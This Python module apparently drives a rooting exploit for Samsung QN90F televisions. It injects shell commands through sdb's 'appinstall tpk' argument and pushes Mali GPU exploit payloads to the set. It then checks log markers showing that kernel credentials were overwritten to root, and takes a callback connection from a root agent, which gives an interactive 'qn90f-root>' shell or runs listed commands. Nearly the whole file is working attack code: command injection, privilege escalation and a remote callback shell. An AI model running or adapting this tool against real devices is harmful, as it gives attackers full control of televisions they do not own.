from __future__ import annotations

import argparse
import asyncio
import re
import secrets
import subprocess
import sys
import tempfile
from dataclasses import dataclass
from pathlib import Path

from .root_agent import (
    DEFAULT_ACCEPT_TIMEOUT,
    DEFAULT_COMMAND_TIMEOUT,
    RootAgentConnection,
    RootAgentError,
    RootAgentServer,
    RootAgentUnavailableError,
    generate_secret,
    write_secret,
)
from .resources import payload_directory
from .sdb import build_shell_injection, find_sdb, route_callback_host


SDB_PORT = 26101
DEFAULT_SDB_TIMEOUT = 15.0
REMOTE_STAGING_DIRECTORY = Path("/home/owner/share/tmp/sdk_tools/qn90f-probe")
REMOTE_PROBE_PATH = REMOTE_STAGING_DIRECTORY / "MaliPhysicalProbe.dll"
REMOTE_AGENT_PATH = REMOTE_STAGING_DIRECTORY / "SamsungTvRootAgent.dll"
ROOT_ACQUISITION_PAYLOAD_FILES = (
    "MaliPhysicalProbe.dll",
    "MaliPhysicalProbe.runtimeconfig.json",
    "SamsungTvRootAgent.dll",
    "SamsungTvRootAgent.runtimeconfig.json",
    "SamsungTvRemoteInputAgent.dll",
    "SamsungTvRemoteInputAgent.runtimeconfig.json",
    "Qn90fSourceControl.dll",
    "Qn90fSourceControl.runtimeconfig.json",
    "Qn90fDisplayControl.dll",
    "Qn90fDisplayControl.runtimeconfig.json",
)
ROOT_CONTROLLER_PAYLOAD_FILES = ROOT_ACQUISITION_PAYLOAD_FILES + (
    "Qn90fPicturePolicyEventAgent.dll",
    "Qn90fPicturePolicyEventAgent.runtimeconfig.json",
    "Qn90fScreenAnalysisDump.dll",
    "Qn90fScreenAnalysisDump.runtimeconfig.json",
)
DEFAULT_PAYLOAD_DIRECTORY = payload_directory("qn90f")


@dataclass(frozen=True)
class TVDeviceProfile:
    name: str = "qn90f"

    def accepts_host(self, host: str) -> bool:
        return bool(host.strip())


class RootSessionError(RootAgentError):
    pass


class RootSessionTransientError(RootSessionError):
    pass


class SdbTransportError(RootSessionTransientError):
    pass


@dataclass(frozen=True)
class RootSessionConfig:
    profile: TVDeviceProfile
    tv_host: str
    callback_host: str
    bind_host: str
    listener_port: int
    accept_timeout: float
    command_timeout: float
    payload_directory: Path
    payload_files: tuple[str, ...] = ROOT_ACQUISITION_PAYLOAD_FILES


@dataclass(frozen=True)
class RootExploitCompletion:
    sdk_uid: int
    sdk_gid: int
    transport_returncode: int

    @classmethod
    async def read_from_agent(
        cls,
        connection: RootAgentConnection,
        result: subprocess.CompletedProcess[str],
        remote_log_path: Path,
        timeout: float,
    ) -> RootExploitCompletion:
        evidence = await connection.execute(
            f"/bin/cat {remote_log_path}",
            timeout,
        )
        if evidence.timed_out or evidence.exit_code != 0:
            detail = evidence.stderr.strip() or evidence.stdout.strip()
            raise RootSessionError(
                "root agent could not read QN90F exploit completion evidence"
                + (f": {detail}" if detail else "")
            )
        return cls.validate(result, evidence.stdout)

    @classmethod
    def validate(
        cls,
        result: subprocess.CompletedProcess[str],
        output: str,
    ) -> RootExploitCompletion:
        if result.returncode not in (0, 1):
            raise RootSessionError(_command_failure("sdb exploit launch", result))
        lines = tuple(line.strip() for line in output.splitlines() if line.strip())
        if not lines:
            raise RootSessionError("QN90F exploit produced no completion evidence")
        failures = tuple(
            line
            for line in lines
            if line.startswith("exception=")
            or line.endswith("=fail")
            or " result=fail" in line
            or line.startswith("root_agent_early_exit")
        )
        if failures:
            raise RootSessionError(
                "QN90F exploit reported failure: " + "; ".join(failures[-3:])
            )
        required = (
            "probe=launch-root-agent",
            "pointer_size=4",
            "architecture=Arm",
            "physical_scan_pte_state=restored",
            "credential_write_reference_guard=pass",
            "credential_prewrite=pass",
            "credential_write=pass",
            "credential_write_readback=pass",
            "root_agent_exec=pass",
            "credential_restore_write=pass",
            "credential_restore_readback=pass",
            "physical_page_pte_state=restored",
            "root_task_action name=agent-launch result=pass",
        )
        missing = tuple(marker for marker in required if marker not in lines)
        if missing:
            raise RootSessionError(
                "QN90F exploit completion evidence is incomplete: " + ", ".join(missing)
            )
        sdk_uid = _single_integer_line(lines, "credential_uid")
        sdk_gid = _single_integer_line(lines, "credential_gid")
        prelaunch = _single_match(
            lines,
            re.compile(
                r"root_agent_prelaunch tid=\d+ uid=(\d+) euid=(\d+) gid=(\d+) egid=(\d+)"
            ),
            "root-agent prelaunch identity",
        )
        if tuple(int(value) for value in prelaunch.groups()) != (0, 0, 0, 0):
            raise RootSessionError(
                "root agent was not launched with a complete root identity"
            )
        restored = _single_match(
            lines,
            re.compile(
                r"credential_restored uid=(\d+) euid=(\d+) gid=(\d+) egid=(\d+)"
            ),
            "restored worker identity",
        )
        restored_identity = tuple(int(value) for value in restored.groups())
        expected_identity = (sdk_uid, sdk_uid, sdk_gid, sdk_gid)
        if restored_identity != expected_identity:
            raise RootSessionError(
                "worker credential restoration mismatch: "
                f"observed={restored_identity} expected={expected_identity}"
            )
        return cls(
            sdk_uid=sdk_uid,
            sdk_gid=sdk_gid,
            transport_returncode=result.returncode,
        )


class SdbExploitClient:
    def __init__(
        self,
        executable: Path,
        tv_host: str,
        *,
        timeout: float = DEFAULT_SDB_TIMEOUT,
    ) -> None:
        self.executable = executable
        self.tv_host = tv_host
        self.timeout = timeout

    @property
    def serial(self) -> str:
        return f"{self.tv_host}:{SDB_PORT}"

    def connect(self) -> None:
        result = self._run(("connect", self.serial), check=False)
        if result.returncode != 0:
            raise SdbTransportError(_command_failure("sdb connect", result))

    def reset_connection(self) -> None:
        self._run(("disconnect", self.serial), check=False)
        self.connect()

    def ensure_staging_directory(self) -> None:
        self.inject(f"/bin/mkdir -p {REMOTE_STAGING_DIRECTORY}")

    def push(self, local_path: Path, remote_path: Path) -> None:
        result = self._run(
            ("-s", self.serial, "push", str(local_path), str(remote_path)),
            check=False,
            timeout=max(self.timeout, 15.0),
        )
        if result.returncode != 0:
            raise SdbTransportError(
                _command_failure(f"sdb push {local_path.name}", result)
            )

    def launch_root_agent(
        self,
        callback_host: str,
        callback_port: int,
        remote_token_path: Path,
        remote_log_path: Path,
        timeout: float,
    ) -> subprocess.CompletedProcess[str]:
        if (
            remote_token_path.parent != REMOTE_STAGING_DIRECTORY
            or remote_log_path.parent != REMOTE_STAGING_DIRECTORY
        ):
            raise RootSessionError(
                "root-agent token and log must use the staging directory"
            )
        command = (
            f"d={REMOTE_STAGING_DIRECTORY};"
            f"/usr/bin/dotnet $d/{REMOTE_PROBE_PATH.name} "
            f"launch-root-agent {callback_host} {callback_port} "
            f"$d/{remote_token_path.name} "
            f">$d/{remote_log_path.name} 2>&1"
        )
        return self.inject(command, timeout=timeout)

    def inject(
        self,
        command: str,
        *,
        timeout: float | None = None,
    ) -> subprocess.CompletedProcess[str]:
        injection = build_shell_injection(command)
        return self._run(
            ("-s", self.serial, "shell", f"0 appinstall tpk {injection}"),
            check=False,
            timeout=timeout or self.timeout,
        )

    def _run(
        self,
        arguments: tuple[str, ...],
        *,
        check: bool,
        timeout: float | None = None,
    ) -> subprocess.CompletedProcess[str]:
        try:
            result = subprocess.run(
                (str(self.executable), *arguments),
                text=True,
                capture_output=True,
                timeout=timeout or self.timeout,
                check=False,
            )
        except subprocess.TimeoutExpired as error:
            raise SdbTransportError(
                f"sdb command timed out after {timeout or self.timeout:g}s"
            ) from error
        if check and result.returncode != 0:
            raise RootSessionError(_command_failure("sdb", result))
        return result


@dataclass(frozen=True)
class Qn90fRootLease:
    config: RootSessionConfig
    connection: RootAgentConnection
    completion: RootExploitCompletion
    remote_log_path: Path
    listener_host: str
    listener_port: int
    closing_listener: asyncio.Server | None = None

    async def shutdown(self) -> None:
        await self.connection.shutdown(self.config.command_timeout)

    async def close(self) -> None:
        await self.connection.close()
        if self.closing_listener is not None:
            await self.closing_listener.wait_closed()


class Qn90fRootAcquirer:
    def __init__(
        self,
        config: RootSessionConfig,
        sdb: SdbExploitClient,
    ) -> None:
        self.config = config
        self.sdb = sdb

    async def acquire(self) -> Qn90fRootLease:
        self.validate_target()
        await asyncio.to_thread(self.sdb.connect)
        return await self._acquire_connected()

    async def _acquire_connected(self) -> Qn90fRootLease:
        with tempfile.TemporaryDirectory(prefix="qn90f-root-session-") as directory:
            secret = generate_secret()
            token_path = Path(directory) / "root-agent.token"
            launch_log_path = Path(directory) / "root-session.log"
            remote_launch_log_path = REMOTE_STAGING_DIRECTORY / (
                f"l-{secrets.token_hex(8)}"
            )
            remote_token_path = REMOTE_STAGING_DIRECTORY / (f"t-{secrets.token_hex(8)}")
            write_secret(token_path, secret)
            launch_log_path.write_text("", encoding="utf-8")
            try:
                await asyncio.to_thread(
                    self.stage,
                    token_path,
                    launch_log_path,
                    remote_token_path,
                    remote_launch_log_path,
                )
                server = RootAgentServer(
                    self.config.bind_host,
                    self.config.listener_port,
                    self.config.tv_host,
                    secret,
                    require_root=True,
                )
                await server.start()
                try:
                    listener_port = server.listening_port
                    launch_result = await asyncio.to_thread(
                        self.sdb.launch_root_agent,
                        self.config.callback_host,
                        listener_port,
                        remote_token_path,
                        remote_launch_log_path,
                        max(self.config.accept_timeout + 15.0, 30.0),
                    )
                    connection = await server.accept(self.config.accept_timeout)
                    completion = await RootExploitCompletion.read_from_agent(
                        connection,
                        launch_result,
                        remote_launch_log_path,
                        self.config.command_timeout,
                    )
                    closing_listener = server.detach(connection)
                    return Qn90fRootLease(
                        config=self.config,
                        connection=connection,
                        completion=completion,
                        remote_log_path=remote_launch_log_path,
                        listener_host=self.config.bind_host,
                        listener_port=listener_port,
                        closing_listener=closing_listener,
                    )
                finally:
                    await server.close()
            except BaseException as error:
                revocation_error = None
                if isinstance(error, SdbTransportError):
                    revocation = "; token_revocation_skipped=transport_unavailable"
                else:
                    try:
                        await asyncio.to_thread(
                            self.revoke_token,
                            launch_log_path,
                            remote_token_path,
                        )
                    except Exception as token_error:
                        revocation_error = token_error
                    revocation = (
                        f"; token_revocation_failed={type(revocation_error).__name__}: {revocation_error}"
                        if revocation_error is not None
                        else "; token_revoked=yes"
                    )
                if isinstance(error, asyncio.CancelledError):
                    raise
                error_type = (
                    RootSessionTransientError
                    if isinstance(
                        error, (RootSessionTransientError, RootAgentUnavailableError)
                    )
                    else RootSessionError
                )
                raise error_type(
                    f"QN90F root acquisition failed; exploit_log={remote_launch_log_path}"
                    f"{revocation}: {error}"
                ) from error

    def validate_target(self) -> None:
        if self.config.profile.name != "qn90f":
            raise RootSessionError("the Mali root session is only validated for qn90f")
        if not self.config.profile.accepts_host(self.config.tv_host):
            raise RootSessionError(
                f"{self.config.tv_host} is not registered to {self.config.profile.name}"
            )
        missing = [
            name
            for name in self.config.payload_files
            if not (self.config.payload_directory / name).is_file()
        ]
        if missing:
            raise RootSessionError(
                "missing built QN90F payloads: "
                + ", ".join(missing)
                + "; run tools/mali-physical-probe/build.sh"
            )

    def stage(
        self,
        token_path: Path,
        launch_log_path: Path,
        remote_token_path: Path,
        remote_launch_log_path: Path,
    ) -> None:
        self.sdb.ensure_staging_directory()
        for name in self.config.payload_files:
            self.sdb.push(
                self.config.payload_directory / name,
                REMOTE_STAGING_DIRECTORY / name,
            )
        self.sdb.push(token_path, remote_token_path)
        self.sdb.push(launch_log_path, remote_launch_log_path)

    def revoke_token(self, empty_path: Path, remote_token_path: Path) -> None:
        self.sdb.push(empty_path, remote_token_path)


class Qn90fRootSession:
    def __init__(
        self,
        config: RootSessionConfig,
        sdb: SdbExploitClient,
    ) -> None:
        self.config = config
        self.sdb = sdb
        self.acquirer = Qn90fRootAcquirer(config, sdb)

    async def run(self, commands: list[str] | None) -> int:
        lease = await self.acquirer.acquire()
        identity = lease.connection.identity
        print(
            f"root_agent_listener={lease.listener_host}:{lease.listener_port} "
            f"tv={self.config.profile.name}@{self.config.tv_host} "
            f"exploit_log={lease.remote_log_path}",
            flush=True,
        )
        print(
            "root_exploit_completed "
            "credential_restored=yes "
            f"worker_uid={lease.completion.sdk_uid} worker_gid={lease.completion.sdk_gid} "
            "pte_restored=yes action=pass "
            f"injection_exit={lease.completion.transport_returncode}",
            flush=True,
        )
        print(
            "root_agent_authenticated "
            f"pid={identity.pid} uid={identity.uid} euid={identity.euid} "
            f"gid={identity.gid} egid={identity.egid} "
            f"cap_eff={identity.effective_capabilities} "
            f"smack={identity.smack_label!r}",
            flush=True,
        )
        try:
            if commands:
                status = await self._run_commands(lease.connection, commands)
            else:
                status = await self._interactive(lease.connection)
            await lease.shutdown()
            return status
        finally:
            await lease.close()

    async def _run_commands(
        self,
        connection: RootAgentConnection,
        commands: list[str],
    ) -> int:
        final_status = 0
        for command in commands:
            result = await connection.execute(command, self.config.command_timeout)
            if result.stdout:
                sys.stdout.write(result.stdout)
            if result.stderr:
                sys.stderr.write(result.stderr)
            print(
                f"command_exit={result.exit_code} "
                f"timed_out={str(result.timed_out).lower()}",
                flush=True,
            )
            if result.exit_code != 0:
                final_status = result.exit_code
        return final_status

    async def _interactive(self, connection: RootAgentConnection) -> int:
        while True:
            try:
                command = await asyncio.to_thread(input, "qn90f-root> ")
            except EOFError:
                return 0
            if not command.strip():
                continue
            if command.strip() in {"exit", "quit"}:
                return 0
            result = await connection.execute(command, self.config.command_timeout)
            if result.stdout:
                sys.stdout.write(result.stdout)
            if result.stderr:
                sys.stderr.write(result.stderr)
            print(
                f"[exit={result.exit_code} timed_out={str(result.timed_out).lower()}]",
                flush=True,
            )


def _single_integer_line(lines: tuple[str, ...], name: str) -> int:
    match = _single_match(
        lines,
        re.compile(rf"{re.escape(name)}=(\d+)"),
        name,
    )
    return int(match.group(1))


def _single_match(
    lines: tuple[str, ...],
    pattern: re.Pattern[str],
    description: str,
) -> re.Match[str]:
    matches = tuple(match for line in lines if (match := pattern.fullmatch(line)))
    if len(matches) != 1:
        raise RootSessionError(
            f"expected one {description} marker, observed {len(matches)}"
        )
    return matches[0]


def _command_failure(
    operation: str,
    result: subprocess.CompletedProcess[str],
) -> str:
    detail = _completed_output(result)
    return f"{operation} failed with exit {result.returncode}" + (
        f": {detail}" if detail else ""
    )


def _completed_output(result: subprocess.CompletedProcess[str]) -> str:
    return "\n".join(
        value.strip() for value in (result.stdout, result.stderr) if value.strip()
    )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Launch one authenticated, nonpersistent QN90F root session"
    )
    parser.add_argument("--host", required=True)
    parser.add_argument("--callback-host")
    parser.add_argument("--bind")
    parser.add_argument("--port", type=int, default=0)
    parser.add_argument("--accept-timeout", type=float, default=DEFAULT_ACCEPT_TIMEOUT)
    parser.add_argument(
        "--command-timeout", type=float, default=DEFAULT_COMMAND_TIMEOUT
    )
    parser.add_argument("--sdb-timeout", type=float, default=DEFAULT_SDB_TIMEOUT)
    parser.add_argument("--command", action="append")
    parser.add_argument(
        "--payload-directory",
        type=Path,
        default=DEFAULT_PAYLOAD_DIRECTORY,
    )
    return parser


def run_root_session(
    profile: TVDeviceProfile,
    tv_host: str,
    *,
    callback_host: str | None = None,
    bind_host: str | None = None,
    listener_port: int = 0,
    accept_timeout: float = DEFAULT_ACCEPT_TIMEOUT,
    command_timeout: float = DEFAULT_COMMAND_TIMEOUT,
    sdb_timeout: float = DEFAULT_SDB_TIMEOUT,
    payload_directory: Path = DEFAULT_PAYLOAD_DIRECTORY,
    commands: list[str] | None = None,
) -> int:
    resolved_callback_host = callback_host or route_callback_host(tv_host)
    config = RootSessionConfig(
        profile=profile,
        tv_host=tv_host,
        callback_host=resolved_callback_host,
        bind_host=bind_host or resolved_callback_host,
        listener_port=listener_port,
        accept_timeout=accept_timeout,
        command_timeout=command_timeout,
        payload_directory=payload_directory.resolve(),
    )
    session = Qn90fRootSession(
        config,
        SdbExploitClient(find_sdb(), tv_host, timeout=sdb_timeout),
    )
    return asyncio.run(session.run(commands))


def main(argv: list[str] | None = None) -> None:
    arguments = build_parser().parse_args(argv)
    try:
        profile = TVDeviceProfile()
        tv_host = arguments.host
        raise SystemExit(
            run_root_session(
                profile,
                tv_host,
                callback_host=arguments.callback_host,
                bind_host=arguments.bind,
                listener_port=arguments.port,
                accept_timeout=arguments.accept_timeout,
                command_timeout=arguments.command_timeout,
                sdb_timeout=arguments.sdb_timeout,
                payload_directory=arguments.payload_directory,
                commands=arguments.command,
            )
        )
    except RootAgentError as error:
        raise SystemExit(str(error)) from error
